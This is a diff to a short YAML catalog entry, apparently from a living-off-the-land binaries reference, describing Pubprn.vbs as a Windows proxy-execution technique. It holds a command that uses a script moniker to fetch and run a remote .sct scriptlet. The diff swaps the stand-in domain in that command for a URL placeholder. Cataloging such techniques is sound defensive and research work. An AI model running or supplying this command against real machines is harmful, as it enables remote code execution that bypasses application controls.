@@ -1,10 +1,10 @@
 ---
 Name: Pubprn.vbs
 Description: Proxy execution with Pubprn.vbs
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
+  - Command: pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
     Description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
     Usecase: Proxy execution
     Category: Execute
